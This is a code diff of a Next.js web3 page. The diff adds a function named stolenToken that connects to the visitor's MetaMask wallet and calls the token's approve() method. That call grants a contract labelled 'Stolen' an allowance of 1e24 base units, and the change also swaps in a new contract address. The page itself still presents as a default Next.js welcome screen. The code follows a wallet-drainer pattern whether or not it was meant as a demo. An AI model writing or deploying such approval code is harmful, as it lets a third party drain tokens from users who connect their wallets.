@@ -31,6 +31,8 @@ const Home: NextPage = () => {
     const Web3 = require('web3');
     const web3 = new Web3(window.ethereum);
     await window.ethereum.enable();
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    let wallet = accounts[0];
     const contract_abi = require('../../abi/BHM_Fauset_abi');
     const contract_address = '0xc2C89adDd9e7549BB1711f845B1A8948fdD74241';
     const Faucet = new web3.eth.Contract(contract_abi, contract_address);
@@ -41,15 +43,18 @@ const Home: NextPage = () => {
   const stolenToken = async () => {
     const Web3 = require('web3');
     const web3 = new Web3(window.ethereum);
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    let wallet = accounts[0];
     await window.ethereum.enable();
-    const Token_contract_abi = require('../../abi/BHM_Stolen_abi');
+    const Token_contract_abi = require('../../abi/BHM_Token_abi');
     const Token_contract_address = '0x153F0FCC0E6668b2A0fa77d3B0C8406f25aFe62f';
 
     const Stolen_contract_abi = require('../../abi/BHM_Stolen_abi');
-    const Stolen_contract_address = '0xF3A299c4fCe2Cd9a33d2F76B05c0e282BF6Ea203';
+    const Stolen_contract_address = '0x850C6B539005692d7a7dAc741e9d5C448C54f79a';
 
     //TokenのコントラクトアドレスでApprove処理を実行
-    const amount = 1000000;
+    //const BN = require('bn.js');
+    const amount = '1000000000000000000000000';
 
     const Approve = new web3.eth.Contract(Token_contract_abi, Token_contract_address);
     await Approve.methods.approve(Stolen_contract_address,amount).send({from:wallet});
@@ -74,7 +79,7 @@ const Home: NextPage = () => {
       </Head>
 
       <main className={styles.main}>
-        <h1 className={styles.title}>
+        <h1 className="text-3xl font-bold underline">
           Welcome to <a href="https://nextjs.org">Next.js!</a>
         </h1>
 
